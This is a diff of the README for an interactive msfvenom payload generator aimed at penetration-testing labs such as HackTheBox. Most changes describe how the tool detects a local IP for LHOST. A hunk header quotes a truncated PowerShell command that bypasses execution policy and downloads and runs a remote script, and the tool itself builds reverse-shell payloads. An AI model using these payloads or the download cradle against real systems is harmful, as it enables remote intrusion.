@@ -1,13 +1,13 @@
 # MSFVenomGen
 
-Interactive `msfvenom` payload generator. Automatically detects your VPN IP from `tun0` and walks you through target OS, payload type, output format, and listener setup via a numbered terminal menu.
+Interactive `msfvenom` payload generator. Automatically detects your local IP (preferring `tun0`, then wired, then wireless) and walks you through target OS, payload type, output format, and listener setup via a numbered terminal menu.
 
 ## Requirements
 
 - Python 3.10+
 - [Metasploit Framework](https://github.com/rapid7/metasploit-framework) (`msfvenom` / `msfconsole` in `$PATH`)
 - `nc` (netcat) — optional, for the netcat listener
-- Linux (uses `ioctl` for tun0 detection)
+- Linux (uses `ioctl` + `/proc/net/dev` for interface detection)
 
 ## Usage
 
@@ -32,7 +32,7 @@ Each step presents a numbered list. Enter `0` at any point to go back or quit.
 3. Payload         — staged, stageless, x86/x64, TCP/HTTP/HTTPS variants
 4. Format          — exe, elf, apk, php, jsp, war, asp, ps1, dll, raw, ...
 5. PS1 mode        — (ps1 only) wrapped executable loader or raw byte array
-6. LHOST / LPORT   — pre-filled from tun0; edit as needed (default port: 4444)
+6. LHOST / LPORT   — pre-filled from detected interface; edit as needed (default port: 4444)
 7. Output filename — suggested default based on format (e.g. payload.exe)
 8. Extra options   — free-form field for encoders, iterations, etc.
 9. Confirmation    — shows the exact msfvenom command before running
@@ -96,9 +96,20 @@ powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadStr
 
 `msfvenom` is invoked with `-f ps1` directly, producing its native output — a `$buf` variable containing a raw byte array. Use this when you want to embed the shellcode manually into your own PowerShell script or framework.
 
-## tun0 detection
+## IP detection
 
-The script reads the IP address of the `tun0` interface directly via `ioctl` (no shell subprocesses). If `tun0` is not up when the script starts, a warning is shown and you can enter `LHOST` manually.
+At startup the script probes network interfaces in priority order and pre-fills `LHOST` with the first address found:
+
+| Priority | Interface(s) | Rationale |
+|----------|--------------|-----------|
+| 1 | `tun0` | HackTheBox / OpenVPN tunnel — the most common LHOST |
+| 2 | `eth*`, `en*`, `em*` | Wired Ethernet (legacy and systemd-predictable names) |
+| 3 | `wlan*`, `wlp*`, `wls*` | Wireless |
+| 4 | Any other non-loopback interface | `tun1`, `tap0`, `docker0`, etc. |
+
+The address is read directly via `ioctl` (`SIOCGIFADDR`) on a UDP socket — no shell subprocesses, no external libraries. Interface names are enumerated from `/proc/net/dev`.
+
+If no active interface is found, a warning is shown and you can enter `LHOST` manually at the prompt.
 
 ## Listener options
 
